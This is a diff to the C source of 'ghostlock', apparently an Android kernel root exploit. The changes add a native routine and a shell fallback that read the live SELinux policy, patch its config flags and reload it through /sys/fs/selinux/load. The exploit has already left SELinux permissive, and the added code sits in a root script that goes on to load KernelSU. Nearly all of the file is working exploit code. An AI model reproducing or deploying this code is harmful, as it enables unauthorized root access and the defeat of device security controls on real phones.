@@ -15,11 +15,89 @@
 #include <sys/system_properties.h>
 #include <sys/utsname.h>
 #include <strings.h>
+#include <limits.h>
 
 const struct kernel_offsets *active_offsets = NULL;
 
 static char g_home_dir[256] = "/data/local/tmp";
 static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";
+static char g_self_exe[PATH_MAX] = "";
+
+static int fix_selinux_policy_c(const char *stage) {
+  int rfd = open("/sys/fs/selinux/policy", O_RDONLY | O_CLOEXEC);
+  if (rfd < 0) {
+    pr_error("fix_policy_c: open /sys/fs/selinux/policy failed errno=%d\n", errno);
+    return -1;
+  }
+  off_t sz = lseek(rfd, 0, SEEK_END);
+  if (sz <= 20) {
+    close(rfd);
+    pr_error("fix_policy_c: invalid policy size %ld\n", (long)sz);
+    return -1;
+  }
+  lseek(rfd, 0, SEEK_SET);
+  uint8_t *buf = malloc((size_t)sz);
+  if (!buf) {
+    close(rfd);
+    pr_error("fix_policy_c: malloc %ld bytes failed\n", (long)sz);
+    return -1;
+  }
+  ssize_t rd = read(rfd, buf, (size_t)sz);
+  close(rfd);
+  if (rd != sz) {
+    free(buf);
+    pr_error("fix_policy_c: read failed rd=%zd sz=%zd errno=%d\n", rd, (ssize_t)sz, errno);
+    return -1;
+  }
+
+  /* Validate SELinux policydb magic (0xf97cff8c in LE) */
+  if (buf[0] != 0x8c || buf[1] != 0xff || buf[2] != 0x7c || buf[3] != 0xf9) {
+    free(buf);
+    pr_error("fix_policy_c: bad magic %02x%02x%02x%02x\n", buf[0], buf[1], buf[2], buf[3]);
+    return -1;
+  }
+
+  uint32_t id_len = 0;
+  memcpy(&id_len, buf + 4, 4);
+  if (id_len == 0 || id_len > 256) {
+    free(buf);
+    pr_error("fix_policy_c: invalid id_len %u\n", id_len);
+    return -1;
+  }
+
+  size_t config_off = 4 + 4 + id_len + 4;
+  if (config_off + 4 > (size_t)sz) {
+    free(buf);
+    pr_error("fix_policy_c: config_off out of range (%zu > %zu)\n", config_off + 4, (size_t)sz);
+    return -1;
+  }
+
+  uint32_t original_config = 0;
+  memcpy(&original_config, buf + config_off, 4);
+  uint32_t fixed_config = original_config | 0xC0000000U;
+  memcpy(buf + config_off, &fixed_config, 4);
+  pr_info("fix_policy_c: config 0x%08x -> 0x%08x (offset 0x%zx stage=%s)\n",
+          original_config, fixed_config, config_off, stage ? stage : "immediate");
+
+  /* Single-syscall atomic write to /sys/fs/selinux/load */
+  int wfd = open("/sys/fs/selinux/load", O_WRONLY | O_CLOEXEC);
+  if (wfd < 0) {
+    free(buf);
+    pr_error("fix_policy_c: open /sys/fs/selinux/load failed errno=%d\n", errno);
+    return -1;
+  }
+  ssize_t wr = write(wfd, buf, (size_t)sz);
+  close(wfd);
+  free(buf);
+
+  if (wr != sz) {
+    pr_error("fix_policy_c: write /sys/fs/selinux/load failed wr=%zd sz=%zd errno=%d\n", wr, (ssize_t)sz, errno);
+    return -1;
+  }
+
+  pr_success("fix_policy_c: loaded %zd bytes to /sys/fs/selinux/load successfully\n", wr);
+  return 0;
+}
 
 /* MTK and XRing use different physical mappings from the Qualcomm default.
  * W1 has no root and /proc is SELinux-blocked: read SoC properties from the
@@ -479,6 +557,8 @@ void init_cpu_config(void) {
   pr_info("cpu pair: main=%d consumer=%d\n", g_core_main, g_core_consumer);
 }
 
+static int g_repair_policy_mode = 1;
+
 static void init_runtime_paths(void) {
   const char *home = getenv("GHOSTLOCK_HOME");
   if (!home || !home[0]) home = getenv("TMPDIR");
@@ -491,11 +571,32 @@ static void init_runtime_paths(void) {
   }
   snprintf(g_root_script_path, sizeof(g_root_script_path),
            "%s/.ghostlock_root.sh", g_home_dir);
-  pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
+
+  ssize_t len = readlink("/proc/self/exe", g_self_exe, sizeof(g_self_exe) - 1);
+  if (len > 0) {
+    g_self_exe[len] = '\0';
+  } else {
+    const char *env_bin = getenv("GHOSTLOCK_BIN");
+    if (env_bin && env_bin[0]) {
+      snprintf(g_self_exe, sizeof(g_self_exe), "%s", env_bin);
+    } else {
+      snprintf(g_self_exe, sizeof(g_self_exe), "%s/libghostlock.so", g_home_dir);
+    }
+  }
+
+  const char *repair_env = getenv("GHOSTLOCK_REPAIR_POLICY");
+  if (repair_env && strcmp(repair_env, "0") == 0) {
+    g_repair_policy_mode = 0;
+  } else {
+    g_repair_policy_mode = 1;
+  }
+
+  pr_info("runtime home=%s script=%s self=%s repair_policy=%d\n",
+          g_home_dir, g_root_script_path, g_self_exe, g_repair_policy_mode);
 }
 
 static void write_root_script(void) {
-  char script[4096];
+  char script[8192];
   int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
   if (sfd < 0) {
     pr_warning("open root script failed path=%s errno=%d\n",
@@ -509,6 +610,7 @@ static void write_root_script(void) {
       "HOME_DIR='%s'\n"
       "LOG=\"$HOME_DIR/.ghostlock_ksu.log\"\n"
       "KSUD=\"$HOME_DIR/ksud\"\n"
+      "REPAIR_POLICY=%d\n"
       "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
       "chmod 644 \"$LOG\" 2>/dev/null\n"
       "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
@@ -537,25 +639,103 @@ static void write_root_script(void) {
       "  exit 1\n"
       "fi\n"
       "KMI=\"${AVER}-${KVER}\"\n"
+      "\n"
+      "GHOSTLOCK_BIN='%s'\n"
+      "if [ ! -x \"$GHOSTLOCK_BIN\" ]; then\n"
+      "  if [ -x \"$HOME_DIR/libghostlock.so\" ]; then\n"
+      "    GHOSTLOCK_BIN=\"$HOME_DIR/libghostlock.so\"\n"
+      "  elif [ -x /data/local/tmp/ghostlock ]; then\n"
+      "    GHOSTLOCK_BIN=/data/local/tmp/ghostlock\n"
+      "  fi\n"
+      "fi\n"
+      "\n"
+      "repair_policy_shell() {\n"
+      "  POLICY_SRC=\"/sys/fs/selinux/policy\"\n"
+      "  [ -r \"$POLICY_SRC\" ] || return 1\n"
+      "  TMP_POL=\"$HOME_DIR/selinux_repaired_policy.tmp\"\n"
+      "  cat \"$POLICY_SRC\" > \"$TMP_POL\" 2>/dev/null || return 1\n"
+      "  [ -s \"$TMP_POL\" ] || { rm -f \"$TMP_POL\"; return 1; }\n"
+      "  ID_LEN=$(od -An -tu4 -j 4 -N 4 \"$TMP_POL\" 2>/dev/null | tr -d '[:space:]')\n"
+      "  if [ -z \"$ID_LEN\" ] || [ \"$ID_LEN\" -le 0 ] || [ \"$ID_LEN\" -gt 256 ]; then\n"
+      "    rm -f \"$TMP_POL\"\n"
+      "    return 1\n"
+      "  fi\n"
+      "  CFG_OFF=$((12 + ID_LEN))\n"
+      "  ORIG_CFG=$(od -An -tu4 -j \"$CFG_OFF\" -N 4 \"$TMP_POL\" 2>/dev/null | tr -d '[:space:]')\n"
+      "  if [ -z \"$ORIG_CFG\" ]; then\n"
+      "    rm -f \"$TMP_POL\"\n"
+      "    return 1\n"
+      "  fi\n"
+      "  FIXED_CFG=$((ORIG_CFG | 3221225472))\n"
+      "  B0=$((FIXED_CFG & 255))\n"
+      "  B1=$(((FIXED_CFG >> 8) & 255))\n"
+      "  B2=$(((FIXED_CFG >> 16) & 255))\n"
+      "  B3=$(((FIXED_CFG >> 24) & 255))\n"
+      "  ENC=$(printf '\\\\%%03o\\\\%%03o\\\\%%03o\\\\%%03o' \"$B0\" \"$B1\" \"$B2\" \"$B3\")\n"
+      "  printf '%%b' \"$ENC\" | dd of=\"$TMP_POL\" bs=1 seek=\"$CFG_OFF\" conv=notrunc status=none 2>/dev/null || { rm -f \"$TMP_POL\"; return 1; }\n"
+      "  SH_RC=1\n"
+      "  if [ -w /sys/fs/selinux/load ]; then\n"
+      "    cat \"$TMP_POL\" > /sys/fs/selinux/load 2>/dev/null && SH_RC=0\n"
+      "  fi\n"
+      "  if [ \"$SH_RC\" -ne 0 ]; then\n"
+      "    load_policy \"$TMP_POL\" 2>/dev/null && SH_RC=0\n"
+      "  fi\n"
+      "  rm -f \"$TMP_POL\"\n"
+      "  return $SH_RC\n"
+      "}\n"
+      "\n"
       "# step 1: restore policy (W1 already made permissive)\n"
       "FIXUP_RC=1\n"
-      "for i in $(seq 1 10); do\n"
-      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
-      "  load_policy /sys/fs/selinux/policy >>\"$LOG\" 2>&1 &\n"
-      "  LPID=$!\n"
-      "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
-      "  SPID=$!\n"
-      "  wait $LPID 2>/dev/null\n"
-      "  FIXUP_RC=$?\n"
-      "  kill $SPID 2>/dev/null\n"
-      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
-      "    break\n"
-      "  fi\n"
-      "  sleep 2\n"
-      "done\n"
+      "if [ \"$REPAIR_POLICY\" -eq 1 ]; then\n"
+      "  for i in $(seq 1 5); do\n"
+      "    echo \"[*] fixup attempt $i (repaired policy)\" >>\"$LOG\"\n"
+      "    if [ -x \"$GHOSTLOCK_BIN\" ]; then\n"
+      "      \"$GHOSTLOCK_BIN\" --fix-policy immediate >>\"$LOG\" 2>&1\n"
+      "      FIXUP_RC=$?\n"
+      "      if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+      "        echo \"[*] native policy repair succeeded\" >>\"$LOG\"\n"
+      "        break\n"
+      "      fi\n"
+      "    fi\n"
+      "    repair_policy_shell >>\"$LOG\" 2>&1\n"
+      "    FIXUP_RC=$?\n"
+      "    if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+      "      echo \"[*] shell policy repair succeeded\" >>\"$LOG\"\n"
+      "      break\n"
+      "    fi\n"
+      "    load_policy /sys/fs/selinux/policy >>\"$LOG\" 2>&1 &\n"
+      "    LPID=$!\n"
+      "    (sleep 5; kill -9 $LPID 2>/dev/null) &\n"
+      "    SPID=$!\n"
+      "    wait $LPID 2>/dev/null\n"
+      "    FIXUP_RC=$?\n"
+      "    kill $SPID 2>/dev/null\n"
+      "    if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+      "      echo \"[*] fallback load_policy succeeded\" >>\"$LOG\"\n"
+      "      break\n"
+      "    fi\n"
+      "    sleep 1\n"
+      "  done\n"
+      "else\n"
+      "  for i in $(seq 1 10); do\n"
+      "    echo \"[*] fixup attempt $i (direct native load_policy)\" >>\"$LOG\"\n"
+      "    load_policy /sys/fs/selinux/policy >>\"$LOG\" 2>&1 &\n"
+      "    LPID=$!\n"
+      "    (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
+      "    SPID=$!\n"
+      "    wait $LPID 2>/dev/null\n"
+      "    FIXUP_RC=$?\n"
+      "    kill $SPID 2>/dev/null\n"
+      "    if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+      "      echo \"[*] direct load_policy succeeded\" >>\"$LOG\"\n"
+      "      break\n"
+      "    fi\n"
+      "    sleep 2\n"
+      "  done\n"
+      "fi\n"
       "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
       "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
-      "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
+      "# policy repair ok: late-load (module init re-enforces); already-loaded restores below\n"
       "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
       "  KSU_ALREADY=1\n"
       "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
@@ -588,7 +768,7 @@ static void write_root_script(void) {
       "else\n"
       "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
       "fi\n",
-      g_home_dir);
+      g_home_dir, g_repair_policy_mode ? 1 : 0, g_self_exe);
   if (n < 0 || n >= (int)sizeof(script)) {
     pr_warning("root script too long\n");
     close(sfd);
@@ -1200,4 +1380,9 @@ int run_exploit(int argc, char **argv) {
   return 0;
 }
 
-int main(int argc, char **argv) { return run_exploit(argc, argv); }
+int main(int argc, char **argv) {
+  if (argc >= 2 && strcmp(argv[1], "--fix-policy") == 0) {
+    return fix_selinux_policy_c(argc >= 3 ? argv[2] : "immediate");
+  }
+  return run_exploit(argc, argv);
+}
